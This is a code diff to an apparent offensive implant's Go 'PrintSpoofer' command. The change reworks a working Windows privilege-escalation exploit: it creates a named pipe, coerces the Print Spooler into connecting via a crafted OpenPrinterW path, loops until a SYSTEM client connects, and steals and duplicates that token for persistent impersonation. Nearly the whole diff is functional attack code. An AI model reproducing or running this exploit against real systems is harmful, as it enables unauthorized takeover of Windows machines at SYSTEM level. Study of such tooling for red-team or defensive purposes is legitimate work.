@@ -43,7 +43,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		_ = json.Unmarshal([]byte(task.Params), &args)
 	}
 	if args.Timeout == 0 {
-		args.Timeout = 15
+		args.Timeout = 30
 	}
 
 	// Check SeImpersonatePrivilege first
@@ -56,8 +56,6 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Get computer name for the printer path.
-	// The PrintSpoofer technique requires the spooler to connect via SMB auth
-	// (not local pipe), so we need a hostname that triggers network-style resolution.
 	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
 	compNameSize := uint32(len(compNameBuf))
 	if err := windows.GetComputerName(&compNameBuf[0], &compNameSize); err != nil {
@@ -83,8 +81,6 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	pipeSuffix := fmt.Sprintf("ps_%x", randBuf[4:8])
 
 	// Create the named pipe: \\.\pipe\{suffix}\pipe\spoolss
-	// The spooler appends \pipe\spoolss to the server path, so we create a pipe
-	// matching that pattern.
 	pipePath := fmt.Sprintf(`\\.\pipe\%s\pipe\spoolss`, pipeSuffix)
 
 	// Create security descriptor allowing Everyone to connect
@@ -119,263 +115,264 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Create pipe with FILE_FLAG_OVERLAPPED for async ConnectNamedPipe
-	hPipe, _, createErr := procCreateNamedPipeW.Call(
-		uintptr(unsafe.Pointer(pipeNamePtr)),
-		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
-		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
-		PIPE_UNLIMITED_INSTANCES,
-		PIPE_BUFFER_SIZE,
-		PIPE_BUFFER_SIZE,
-		0,
-		uintptr(unsafe.Pointer(&sa)),
-	)
-	if hPipe == uintptr(windows.InvalidHandle) {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CreateNamedPipe failed for %s: %v", pipePath, createErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	pipeHandle := windows.Handle(hPipe)
-	defer windows.CloseHandle(pipeHandle)
-
-	// Start async ConnectNamedPipe with OVERLAPPED
-	event, eventErr := windows.CreateEvent(nil, 1, 0, nil) // manual-reset, non-signaled
-	if eventErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	defer windows.CloseHandle(event)
-
-	var overlapped windows.Overlapped
-	overlapped.HEvent = event
-
-	ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
-	if ret == 0 && connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	alreadyConnected := connectErr == windows.ERROR_PIPE_CONNECTED
-
-	// Declare outside the if block so they're available for success output.
-	// All hostnames must trigger SMB authentication to get SYSTEM.
-	// "localhost" is NOT included — it uses the local pipe namespace which
-	// yields NETWORK SERVICE (our own process token) instead of SYSTEM.
-	// Hostname priority:
-	// 1. Computer name (NetBIOS) — triggers SMB auth via loopback
-	// 2. DNS FQDN — triggers SMB auth via DNS resolution
-	// 3. 127.0.0.1 — forces SMB over TCP loopback
-	var triggerWarnings []string
+	// Build hostname list for triggers.
+	// All hostnames should trigger SMB authentication to get SYSTEM.
 	hostnames := []string{computerName}
 	if dnsHostname != "" && dnsHostname != computerName {
 		hostnames = append(hostnames, dnsHostname)
 	}
 	hostnames = append(hostnames, "127.0.0.1")
 
-	if !alreadyConnected {
-		// Trigger the Print Spooler to connect to our pipe.
-		// OpenPrinterW("\\HOSTNAME/pipe/{suffix}") causes the spooler to
-		// connect to \\HOSTNAME\pipe\{suffix}\pipe\spoolss = our pipe.
-		// The forward slash in /pipe/ is key — it's interpreted as path separator.
-		//
-		// Try multiple hostname formats since some Windows builds reject certain names.
-		// OpenPrinterW errors are non-fatal — the pipe connection is what matters.
-		//
-		// IMPORTANT: OpenPrinterW uses SyscallN which blocks the OS thread.
-		// On domain-joined systems, it can block indefinitely during path resolution.
-		// Each trigger runs in a separate goroutine with a 5-second timeout.
-		// Build hostname list: computer name, FQDN (if available), localhost.
-		// The spooler must connect via SMB authentication (not local pipe) to
-		// impersonate as SYSTEM. Computer name and FQDN trigger SMB auth;
-		// localhost may connect via local path and yield NETWORK SERVICE.
+	// Fire ALL triggers simultaneously in goroutines.
+	// Some may block (SyscallN), others may return quickly.
+	var triggerWarnings []string
+	perTriggerTimeout := time.Duration(args.Timeout) * time.Second
+	for _, host := range hostnames {
+		printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
+		triggerDone := make(chan error, 1)
+		h := host // capture for closure
+		go func(name string) {
+			triggerDone <- triggerSpooler(name)
+		}(printerName)
 
-		// Per-trigger timeout: use half of the overall timeout (divided among triggers)
-		// but at least 10s. OpenPrinterW on domain-joined machines can block during
-		// name resolution, especially for NetBIOS names going through WINS/broadcast.
-		perTriggerTimeout := time.Duration(args.Timeout/len(hostnames)) * time.Second
-		if perTriggerTimeout < 10*time.Second {
-			perTriggerTimeout = 10 * time.Second
-		}
-		for _, host := range hostnames {
-			printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
-			triggerTimeout := perTriggerTimeout
-
-			// Run trigger in goroutine — OpenPrinterW can block the OS thread
-			triggerDone := make(chan error, 1)
-			go func(name string) {
-				triggerDone <- triggerSpooler(name)
-			}(printerName)
-
+		// Don't wait for result — fire and forget. Check for quick errors.
+		go func(hostName string, done chan error) {
 			select {
-			case triggerErr := <-triggerDone:
+			case triggerErr := <-done:
 				if triggerErr != nil {
-					triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: %v", host, triggerErr))
+					// Just log; we'll collect diagnostics later from the main goroutine
+					_ = triggerErr
 				}
-			case <-time.After(triggerTimeout):
-				triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: OpenPrinterW timed out (%s)", host, triggerTimeout))
+			case <-time.After(perTriggerTimeout):
+				// Timed out — the goroutine is stuck in SyscallN
 			}
-
-			// Check if spooler connected (1s check)
-			checkResult, _ := windows.WaitForSingleObject(event, 1000)
-			if checkResult == windows.WAIT_OBJECT_0 {
-				break // Connected!
-			}
-		}
-
-		// Wait for spooler to connect (remaining timeout)
-		timeoutMs := uint32(args.Timeout * 1000)
-		waitResult, _ := windows.WaitForSingleObject(event, timeoutMs)
-		switch waitResult {
-		case windows.WAIT_OBJECT_0:
-			// Connected!
-		case 258: // WAIT_TIMEOUT
-			windows.CancelIoEx(pipeHandle, &overlapped)
-			var sb strings.Builder
-			sb.WriteString(fmt.Sprintf("Timeout after %ds — Print Spooler did not connect to %s.\n", args.Timeout, pipePath))
-			sb.WriteString("Possible causes:\n")
-			sb.WriteString("- Print Spooler not running (sc query spooler)\n")
-			sb.WriteString("- Technique may be patched on this Windows build\n")
-			sb.WriteString("- SeImpersonatePrivilege context required\n")
-			if len(triggerWarnings) > 0 {
-				sb.WriteString("\nTrigger diagnostics:\n")
-				for _, w := range triggerWarnings {
-					sb.WriteString(fmt.Sprintf("  %s\n", w))
-				}
-			}
-			return structs.CommandResult{
-				Output:    sb.String(),
-				Status:    "error",
-				Completed: true,
-			}
-		default:
-			windows.CancelIoEx(pipeHandle, &overlapped)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("WaitForSingleObject failed: result=%d", waitResult),
-				Status:    "error",
-				Completed: true,
-			}
-		}
+		}(h, triggerDone)
 	}
 
-	// Lock goroutine to OS thread for the entire impersonation sequence.
-	// ImpersonateNamedPipeClient sets the token on the current OS thread,
-	// and Go's scheduler can migrate goroutines between threads at any point.
-	// Without LockOSThread, OpenThreadToken may run on a different thread
-	// and fail with ERROR_NO_TOKEN (1008).
-	runtime.LockOSThread()
-
-	// Spooler connected — impersonate the SYSTEM token
-	impRet, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
-	if impRet == 0 {
-		runtime.UnlockOSThread()
-		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v", impErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Get the impersonated identity
-	clientIdentity, _ := GetCurrentIdentity()
-	if clientIdentity == "" {
-		clientIdentity = "unknown"
-	}
-
-	// Capture the thread impersonation token
-	var threadToken windows.Token
-	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
-	if err != nil {
-		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
-	}
-	if err != nil {
-		procRevertToSelf.Call()
-		runtime.UnlockOSThread()
-		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Duplicate to a primary token for persistent use
+	// Now accept pipe connections in a loop, checking each for SYSTEM identity.
+	// Multiple clients may connect: our own OpenPrinterW calls (yielding our token)
+	// or the Spooler service (yielding SYSTEM). We want the Spooler's connection.
+	deadline := time.Now().Add(time.Duration(args.Timeout) * time.Second)
+	var clientIdentity string
 	var dupToken windows.Token
-	err = windows.DuplicateTokenEx(
-		threadToken,
-		windows.MAXIMUM_ALLOWED,
-		nil,
-		windows.SecurityDelegation,
-		windows.TokenPrimary,
-		&dupToken,
-	)
-	if err != nil {
+	attempt := 0
+
+	for time.Now().Before(deadline) {
+		attempt++
+		remaining := time.Until(deadline)
+		if remaining <= 0 {
+			break
+		}
+
+		// Create pipe instance for this attempt
+		hPipe, _, createErr := procCreateNamedPipeW.Call(
+			uintptr(unsafe.Pointer(pipeNamePtr)),
+			PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
+			PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
+			PIPE_UNLIMITED_INSTANCES,
+			PIPE_BUFFER_SIZE,
+			PIPE_BUFFER_SIZE,
+			0,
+			uintptr(unsafe.Pointer(&sa)),
+		)
+		if hPipe == uintptr(windows.InvalidHandle) {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("CreateNamedPipe failed for %s (attempt %d): %v", pipePath, attempt, createErr),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		pipeHandle := windows.Handle(hPipe)
+
+		// Start async ConnectNamedPipe
+		event, eventErr := windows.CreateEvent(nil, 1, 0, nil)
+		if eventErr != nil {
+			windows.CloseHandle(pipeHandle)
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		var overlapped windows.Overlapped
+		overlapped.HEvent = event
+
+		ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
+		if ret == 0 && connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
+			windows.CloseHandle(event)
+			windows.CloseHandle(pipeHandle)
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("ConnectNamedPipe failed (attempt %d): %v", attempt, connectErr),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		connected := connectErr == windows.ERROR_PIPE_CONNECTED
+		if !connected {
+			waitMs := uint32(remaining.Milliseconds())
+			if waitMs > 5000 {
+				waitMs = 5000 // Check every 5 seconds
+			}
+			waitResult, _ := windows.WaitForSingleObject(event, waitMs)
+			if waitResult == windows.WAIT_OBJECT_0 {
+				connected = true
+			}
+		}
+
+		if !connected {
+			windows.CancelIoEx(pipeHandle, &overlapped)
+			windows.CloseHandle(event)
+			windows.CloseHandle(pipeHandle)
+			continue // Try accepting next connection
+		}
+
+		// Client connected — lock thread and impersonate to check identity
+		runtime.LockOSThread()
+		impRet, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
+		if impRet == 0 {
+			runtime.UnlockOSThread()
+			procDisconnectNamedPipe.Call(hPipe)
+			windows.CloseHandle(event)
+			windows.CloseHandle(pipeHandle)
+			triggerWarnings = append(triggerWarnings, fmt.Sprintf("attempt %d: ImpersonateNamedPipeClient failed: %v", attempt, impErr))
+			continue
+		}
+
+		identity, _ := GetCurrentIdentity()
+		if identity == "" {
+			identity = "unknown"
+		}
+
+		// Check if this is SYSTEM (the Spooler's token)
+		isSystem := strings.Contains(strings.ToUpper(identity), "SYSTEM")
+
+		if !isSystem {
+			// Not SYSTEM — this is likely our own process's connection.
+			// Revert and disconnect, wait for the next connection.
+			procRevertToSelf.Call()
+			runtime.UnlockOSThread()
+			procDisconnectNamedPipe.Call(hPipe)
+			windows.CloseHandle(event)
+			windows.CloseHandle(pipeHandle)
+			triggerWarnings = append(triggerWarnings, fmt.Sprintf("attempt %d: connected as %s (not SYSTEM), retrying", attempt, identity))
+			continue
+		}
+
+		// SYSTEM token! Capture it.
+		clientIdentity = identity
+
+		var threadToken windows.Token
+		err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
+		if err != nil {
+			err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
+		}
+		if err != nil {
+			procRevertToSelf.Call()
+			runtime.UnlockOSThread()
+			procDisconnectNamedPipe.Call(hPipe)
+			windows.CloseHandle(event)
+			windows.CloseHandle(pipeHandle)
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
 		err = windows.DuplicateTokenEx(
 			threadToken,
 			windows.MAXIMUM_ALLOWED,
 			nil,
-			windows.SecurityImpersonation,
-			windows.TokenImpersonation,
+			windows.SecurityDelegation,
+			windows.TokenPrimary,
 			&dupToken,
 		)
-	}
-	threadToken.Close()
+		if err != nil {
+			err = windows.DuplicateTokenEx(
+				threadToken,
+				windows.MAXIMUM_ALLOWED,
+				nil,
+				windows.SecurityImpersonation,
+				windows.TokenImpersonation,
+				&dupToken,
+			)
+		}
+		threadToken.Close()
 
-	if err != nil {
+		if err != nil {
+			procRevertToSelf.Call()
+			runtime.UnlockOSThread()
+			procDisconnectNamedPipe.Call(hPipe)
+			windows.CloseHandle(event)
+			windows.CloseHandle(pipeHandle)
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		// Clean up pipe
 		procRevertToSelf.Call()
-		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
+		windows.CloseHandle(event)
+		windows.CloseHandle(pipeHandle)
+
+		// Store in global identity system
+		if setErr := SetIdentityToken(dupToken); setErr != nil {
+			runtime.UnlockOSThread()
+			windows.CloseHandle(windows.Handle(dupToken))
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		osThreadLocked = true
+
+		var sb strings.Builder
+		sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
+		sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
+		sb.WriteString(fmt.Sprintf("Hostnames tried: %v\n", hostnames))
+		sb.WriteString(fmt.Sprintf("Captured identity: %s\n", clientIdentity))
+		sb.WriteString(fmt.Sprintf("Attempts: %d\n", attempt))
+		sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", clientIdentity))
+		if len(triggerWarnings) > 0 {
+			sb.WriteString("\nDiagnostics:\n")
+			for _, w := range triggerWarnings {
+				sb.WriteString(fmt.Sprintf("  %s\n", w))
+			}
+		}
+		sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
+		sb.WriteString("Use 'whoami' to verify current context.\n")
+
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
-			Status:    "error",
+			Output:    sb.String(),
+			Status:    "success",
 			Completed: true,
 		}
 	}
 
-	// Clean up impersonation and pipe
-	procRevertToSelf.Call()
-	procDisconnectNamedPipe.Call(hPipe)
-
-	// Store in global identity system (calls ImpersonateLoggedOnUser on this thread)
-	if setErr := SetIdentityToken(dupToken); setErr != nil {
-		runtime.UnlockOSThread()
-		windows.CloseHandle(windows.Handle(dupToken))
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Mark as thread-locked so PrepareExecution doesn't double-lock
-	osThreadLocked = true
-
+	// Timeout — no SYSTEM connection received
 	var sb strings.Builder
-	sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
-	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
-	sb.WriteString(fmt.Sprintf("Hostnames tried: %v\n", hostnames))
-	sb.WriteString(fmt.Sprintf("Captured identity: %s\n", clientIdentity))
-	sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", clientIdentity))
+	sb.WriteString(fmt.Sprintf("Timeout after %ds — Print Spooler did not connect as SYSTEM to %s.\n", args.Timeout, pipePath))
+	sb.WriteString(fmt.Sprintf("Attempts: %d\n", attempt))
+	sb.WriteString("Possible causes:\n")
+	sb.WriteString("- Print Spooler not running (sc query spooler)\n")
+	sb.WriteString("- Technique may be patched on this Windows build\n")
+	sb.WriteString("- SMB loopback connections may be blocked\n")
 	if len(triggerWarnings) > 0 {
-		sb.WriteString("\nTrigger diagnostics:\n")
+		sb.WriteString("\nDiagnostics:\n")
 		for _, w := range triggerWarnings {
 			sb.WriteString(fmt.Sprintf("  %s\n", w))
 		}
 	}
-	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
-	sb.WriteString("Use 'whoami' to verify current context.\n")
-
 	return structs.CommandResult{
 		Output:    sb.String(),
-		Status:    "success",
+		Status:    "error",
 		Completed: true,
 	}
 }
